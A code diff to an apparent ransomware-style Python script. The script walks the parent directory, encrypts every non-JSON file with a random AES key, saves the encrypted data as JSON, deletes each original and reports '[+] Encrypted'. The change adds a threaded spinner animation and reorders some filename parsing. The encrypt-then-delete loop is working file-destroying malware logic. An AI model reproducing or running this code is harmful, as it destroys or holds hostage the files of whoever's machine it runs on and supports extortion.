@@ -1,5 +1,6 @@
 from base64 import b64encode, b64decode
-import encryption, constants, os, json, cryptools
+from threading import Thread
+import encryption, constants, os, json, cryptools, time, sys
 
 
 '''
@@ -9,7 +10,19 @@ where this program is executed
 
 '''
 
+progressbar = True
+
+repeat = True
+
 def main():
+
+	global justPrinted
+
+	global repeat
+
+	animation = Thread(target=cinematics)
+
+	animation.start()
 
 	folder_path = '..'
 
@@ -22,14 +35,17 @@ def main():
 
 		for file in sub_files:
 
+			fileName = ''.join(file.split('.')[:-1])
+
+			ext = file.split('.')[-1]
+
+
 			if len(file.split('.')) == 0 or file.endswith('json'):
 				continue
 
 			json_dict = dict()
 
-			ext = file.split('.')[-1]
 
-			fileName = ''.join(file.split('.')[:-1])
 
 			aes_key = os.urandom(constants.AES_KEY_LENGTH)
 
@@ -56,11 +72,25 @@ def main():
 			with open(os.path.join(current_directory, fileName + '.json'), 'w') as json_file:
 				json.dump(json_dict, json_file)
 
+			progressbar = False
+			print('\n[+] Encrypted %s\n' % os.path.join(current_directory, fileName + '.' + ext))
+			progressbar = True
+
 			os.remove(os.path.join(current_directory, file))
-			print('\n[+] Encrypted %s\n' % os.path.join(current_directory, file))
+	repeat = False
 
-	
-
+def cinematics():
+	while repeat:
+		if progressbar:
+			sys.stdout.write('\b/')
+			sys.stdout.flush()
+			time.sleep(0.1)
+			sys.stdout.write('\b-')
+			sys.stdout.flush()
+			time.sleep(0.1)
+			sys.stdout.write('\b\\')
+			sys.stdout.flush()
+			time.sleep(0.1)
 
 if __name__ == '__main__':
 	main()
